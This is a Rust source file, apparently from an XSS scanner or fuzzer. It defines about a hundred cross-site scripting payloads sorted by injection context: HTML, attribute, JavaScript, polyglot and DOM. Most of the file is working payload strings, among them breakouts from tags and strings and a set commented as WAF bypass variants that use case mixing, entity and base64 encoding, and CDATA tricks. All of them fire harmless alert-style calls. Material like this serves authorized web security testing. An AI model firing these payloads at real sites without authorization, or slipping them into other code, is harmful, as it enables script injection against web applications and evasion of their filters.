use rand::seq::SliceRandom;
use rand::thread_rng;

pub mod generator;
pub mod encoding;

#[derive(Debug, Clone, PartialEq)]
pub enum PayloadContext {
    Html,
    Attribute,
    JavaScript,
    Url,
    Polyglot,
    Dom,
}

#[derive(Debug, Clone)]
pub struct Payload {
    pub raw: String,
    pub context: PayloadContext,
    pub description: &'static str,
}

impl Payload {
    fn new(raw: &str, ctx: PayloadContext, desc: &'static str) -> Self {
        Self { raw: raw.to_string(), context: ctx, description: desc }
    }
}

pub fn all_payloads() -> Vec<Payload> {
    let mut p = vec![];
    p.extend(html_payloads());
    p.extend(attribute_payloads());
    p.extend(js_payloads());
    p.extend(polyglot_payloads());
    p.extend(dom_payloads());
    p
}

pub fn html_payloads() -> Vec<Payload> {
    vec![
        Payload::new("<script>alert(1)</script>", PayloadContext::Html, "basic script tag"),
        Payload::new("<script>alert('XSS')</script>", PayloadContext::Html, "script alert string"),
        Payload::new("<script>alert`1`</script>", PayloadContext::Html, "script alert template"),
        Payload::new("<script>prompt(1)</script>", PayloadContext::Html, "script prompt"),
        Payload::new("<script>confirm(1)</script>", PayloadContext::Html, "script confirm"),
        Payload::new("<Script>alert(1)</Script>", PayloadContext::Html, "mixed-case script"),
        Payload::new("<SCRIPT>alert(1)</SCRIPT>", PayloadContext::Html, "uppercase script"),
        Payload::new("<img src=x onerror=alert(1)>", PayloadContext::Html, "img onerror"),
        Payload::new("<img src=x onerror=alert`1`>", PayloadContext::Html, "img onerror template"),
        Payload::new("<img src=x onerror='alert(1)'>", PayloadContext::Html, "img onerror single-quote"),
        Payload::new("<img src=x onerror=\"alert(1)\">", PayloadContext::Html, "img onerror double-quote"),
        Payload::new("<IMG SRC=x ONERROR=alert(1)>", PayloadContext::Html, "uppercase img"),
        Payload::new("<img src=1 href=1 onerror=\"javascript:alert(1)\">", PayloadContext::Html, "img href onerror"),
        Payload::new("<svg onload=alert(1)>", PayloadContext::Html, "svg onload"),
        Payload::new("<svg/onload=alert(1)>", PayloadContext::Html, "svg slash onload"),
        Payload::new("<SVG ONLOAD=alert(1)>", PayloadContext::Html, "uppercase svg"),
        Payload::new("<svg onload=alert`1`>", PayloadContext::Html, "svg template literal"),
        Payload::new("<svg><script>alert(1)</script></svg>", PayloadContext::Html, "svg embedded script"),
        Payload::new("<body onload=alert(1)>", PayloadContext::Html, "body onload"),
        Payload::new("<body/onload=alert(1)>", PayloadContext::Html, "body slash onload"),
        Payload::new("<input onfocus=alert(1) autofocus>", PayloadContext::Html, "input autofocus"),
        Payload::new("<input onblur=alert(1) autofocus><input autofocus>", PayloadContext::Html, "input onblur"),
        Payload::new("<select onfocus=alert(1) autofocus>", PayloadContext::Html, "select autofocus"),
        Payload::new("<textarea onfocus=alert(1) autofocus>", PayloadContext::Html, "textarea autofocus"),
        Payload::new("<keygen onfocus=alert(1) autofocus>", PayloadContext::Html, "keygen autofocus"),
        Payload::new("<video src=x onerror=alert(1)>", PayloadContext::Html, "video onerror"),
        Payload::new("<audio src=x onerror=alert(1)>", PayloadContext::Html, "audio onerror"),
        Payload::new("<iframe src=javascript:alert(1)>", PayloadContext::Html, "iframe javascript:"),
        Payload::new("<iframe src=\"javascript:alert(1)\">", PayloadContext::Html, "iframe javascript quoted"),
        Payload::new("<iframe onload=alert(1)>", PayloadContext::Html, "iframe onload"),
        Payload::new("<object data=javascript:alert(1)>", PayloadContext::Html, "object javascript:"),
        Payload::new("<embed src=javascript:alert(1)>", PayloadContext::Html, "embed javascript:"),
        Payload::new("<link rel=import href=javascript:alert(1)>", PayloadContext::Html, "link import"),
        Payload::new("<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">", PayloadContext::Html, "math xlink"),
        Payload::new("<table><td background=\"javascript:alert(1)\">", PayloadContext::Html, "table background"),
        Payload::new("<div onmouseover=alert(1)>x</div>", PayloadContext::Html, "div onmouseover"),
        Payload::new("<a href=javascript:alert(1)>click</a>", PayloadContext::Html, "anchor javascript:"),
        Payload::new("<details open ontoggle=alert(1)>", PayloadContext::Html, "details ontoggle"),
        Payload::new("<marquee onstart=alert(1)>", PayloadContext::Html, "marquee onstart"),
        Payload::new("</textarea><script>alert(1)</script>", PayloadContext::Html, "textarea breakout"),
        Payload::new("</title><script>alert(1)</script>", PayloadContext::Html, "title breakout"),
        Payload::new("</style><script>alert(1)</script>", PayloadContext::Html, "style breakout"),
        Payload::new("</noscript><script>alert(1)</script>", PayloadContext::Html, "noscript breakout"),
        Payload::new("</script><script>alert(1)</script>", PayloadContext::Html, "script-in-script breakout"),
        // WAF bypass variants
        Payload::new("<ScRiPt>alert(1)</ScRiPt>", PayloadContext::Html, "random-case script"),
        Payload::new("<script >alert(1)</script >", PayloadContext::Html, "script space"),
        Payload::new("<script\t>alert(1)</script>", PayloadContext::Html, "script tab"),
        Payload::new("<script\n>alert(1)</script>", PayloadContext::Html, "script newline"),
        Payload::new("<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">", PayloadContext::Html, "html entity encoding"),
        Payload::new("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", PayloadContext::Html, "base64 eval"),
        Payload::new("<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>", PayloadContext::Html, "CDATA bypass"),
        Payload::new("<script src=data:,alert(1)>", PayloadContext::Html, "data: src"),
    ]
}

pub fn attribute_payloads() -> Vec<Payload> {
    vec![
        Payload::new("\" onmouseover=alert(1) \"", PayloadContext::Attribute, "attr breakout dquote onmouseover"),
        Payload::new("' onmouseover=alert(1) '", PayloadContext::Attribute, "attr breakout squote onmouseover"),
        Payload::new("\" autofocus onfocus=alert(1) \"", PayloadContext::Attribute, "attr onfocus"),
        Payload::new("\" onclick=alert(1) \"", PayloadContext::Attribute, "attr onclick"),
        Payload::new("\" onerror=alert(1) \"", PayloadContext::Attribute, "attr onerror"),
        Payload::new("\" onload=alert(1) \"", PayloadContext::Attribute, "attr onload"),
        Payload::new("\"><script>alert(1)</script>", PayloadContext::Attribute, "attr breakout to script"),
        Payload::new("'><script>alert(1)</script>", PayloadContext::Attribute, "attr squote breakout to script"),
        Payload::new("\"><img src=x onerror=alert(1)>", PayloadContext::Attribute, "attr breakout to img"),
        Payload::new("javascript:alert(1)", PayloadContext::Attribute, "javascript: protocol in href/src"),
        Payload::new("data:text/html,<script>alert(1)</script>", PayloadContext::Attribute, "data uri"),
        Payload::new("\" onpointerover=alert(1) \"", PayloadContext::Attribute, "pointer event"),
        Payload::new("\" onanimationstart=alert(1) style=animation-name:x \"", PayloadContext::Attribute, "animation event"),
        Payload::new("\" tabindex=1 onfocus=alert(1) \"", PayloadContext::Attribute, "tabindex onfocus"),
        Payload::new("`onmouseover=alert(1) `", PayloadContext::Attribute, "backtick attribute"),
    ]
}

pub fn js_payloads() -> Vec<Payload> {
    vec![
        Payload::new("';alert(1)//", PayloadContext::JavaScript, "js single-quote breakout"),
        Payload::new("\";alert(1)//", PayloadContext::JavaScript, "js double-quote breakout"),
        Payload::new("`;alert(1)//", PayloadContext::JavaScript, "js template breakout"),
        Payload::new("'-alert(1)-'", PayloadContext::JavaScript, "js concat alert"),
        Payload::new("\"-alert(1)-\"", PayloadContext::JavaScript, "js double-concat alert"),
        Payload::new("</script><script>alert(1)</script>", PayloadContext::JavaScript, "js close script"),
        Payload::new("';alert(1);'", PayloadContext::JavaScript, "js statement injection"),
        Payload::new("\\';alert(1)//", PayloadContext::JavaScript, "js backslash escape"),
        Payload::new("</script><img src=x onerror=alert(1)>", PayloadContext::JavaScript, "js close + img"),
        Payload::new("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", PayloadContext::JavaScript, "hex escape script"),
        Payload::new("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", PayloadContext::JavaScript, "unicode escape script"),
        Payload::new("'-eval(atob('YWxlcnQoMSk='))-'", PayloadContext::JavaScript, "base64 in js"),
        Payload::new("';window['ale'+'rt'](1)//", PayloadContext::JavaScript, "split string alert"),
        Payload::new("';(alert)(1)//", PayloadContext::JavaScript, "parenthesized alert"),
        Payload::new("';window.alert(1)//", PayloadContext::JavaScript, "window.alert"),
        Payload::new("';self['alert'](1)//", PayloadContext::JavaScript, "self alert"),
        Payload::new("'-top.alert(1)-'", PayloadContext::JavaScript, "top.alert"),
    ]
}

pub fn polyglot_payloads() -> Vec<Payload> {
    vec![
        Payload::new(
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            PayloadContext::Polyglot,
            "classic polyglot",
        ),
        Payload::new(
            "\"><<script>alert(1)</script>",
            PayloadContext::Polyglot,
            "double open bracket",
        ),
        Payload::new(
            "'-alert(1)-'\" onmouseover=alert(1) <script>alert(1)</script>",
            PayloadContext::Polyglot,
            "multi-context polyglot",
        ),
        Payload::new(
            "';alert(0)//\";alert(1)//</script><svg onload=alert(2)>",
            PayloadContext::Polyglot,
            "js+html polyglot",
        ),
        Payload::new(
            "<script>/*</script><svg/onload=alert(1)>/**/</script>",
            PayloadContext::Polyglot,
            "comment polyglot",
        ),
        Payload::new(
            "\" autofocus onfocus=alert(1)//",
            PayloadContext::Polyglot,
            "attr+js polyglot",
        ),
        Payload::new(
            "<!--<img src=x:alert(alt) onerror=eval(src) alt=javascript:0>-->",
            PayloadContext::Polyglot,
            "html comment polyglot",
        ),
        Payload::new(
            "\"onmouseover='alert(1)'><<svg/onload=alert(2)>",
            PayloadContext::Polyglot,
            "attr+svg polyglot",
        ),
    ]
}

pub fn dom_payloads() -> Vec<Payload> {
    vec![
        Payload::new("#<script>alert(1)</script>", PayloadContext::Dom, "fragment script"),
        Payload::new("#\"><img src=x onerror=alert(1)>", PayloadContext::Dom, "fragment img"),
        Payload::new("#<svg onload=alert(1)>", PayloadContext::Dom, "fragment svg"),
        Payload::new("#javascript:alert(1)", PayloadContext::Dom, "fragment javascript:"),
        Payload::new("?q=<script>alert(1)</script>", PayloadContext::Dom, "dom search injection"),
        Payload::new("\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", PayloadContext::Dom, "dom hex injection"),
    ]
}

pub fn get_payloads_for_set(set: &str) -> Vec<Payload> {
    match set {
        "html" => html_payloads(),
        "attr" | "attribute" => attribute_payloads(),
        "js" => js_payloads(),
        "poly" | "polyglot" => polyglot_payloads(),
        "dom" => dom_payloads(),
        _ => all_payloads(),
    }
}

pub fn shuffle_payloads(payloads: &mut Vec<Payload>) {
    payloads.shuffle(&mut thread_rng());
}
